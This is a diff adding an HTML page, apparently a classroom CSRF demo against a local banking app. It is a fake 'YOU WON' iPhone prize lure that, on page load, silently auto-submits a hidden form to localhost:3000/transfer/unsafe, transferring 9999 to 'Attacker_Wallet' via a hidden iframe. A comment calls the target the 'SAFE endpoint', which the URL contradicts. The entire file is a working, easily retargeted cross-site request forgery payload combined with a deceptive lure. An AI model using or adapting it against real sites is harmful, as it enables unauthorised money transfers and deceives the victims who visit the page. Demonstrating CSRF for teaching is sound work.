@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CLAIM YOUR PRIZE!</title>
+    <style>
+        body { font-family: 'Arial Black', Impact, sans-serif; background-color: #ffeaa7; text-align: center; margin-top: 100px; color: #d63031; }
+        .scam-container { background: white; max-width: 600px; margin: 0 auto; padding: 40px; border: 5px dashed #d63031; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        h1 { font-size: 3em; margin: 0 0 10px 0; text-transform: uppercase; animation: blink 1s infinite; }
+        p { font-family: Arial, sans-serif; font-size: 1.2em; color: #2d3436; }
+        .spinner { margin-top: 20px; font-size: 2em; animation: spin 2s linear infinite; }
+        
+        @keyframes blink { 50% { opacity: 0.5; } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="scam-container">
+        <h1>🎉 YOU WON! 🎉</h1>
+        <p>A brand new iPhone 16 Pro is waiting for you.</p>
+        <p>Validating your IP address...</p>
+        <div class="spinner">⏳</div>
+    </div>
+
+    <!-- Hidden iframe to absorb the redirect silently -->
+    <iframe name="stealth-frame" style="display: none;"></iframe>
+
+    <!-- Hidden form attacking the SAFE endpoint for the final demo -->
+    <form id="steal-money-form" action="http://localhost:3000/transfer/unsafe" method="POST" target="stealth-frame" style="display: none;">
+        <input type="hidden" name="to" value="Attacker_Wallet">
+        <input type="hidden" name="amount" value="9999">
+    </form>
+
+    <script>
+        window.onload = function() {
+            // Fires the form at the bank in the background
+            document.getElementById("steal-money-form").submit();
+            console.log("CSRF payload deployed.");
+        };
+    </script>
+</body>
+</html>
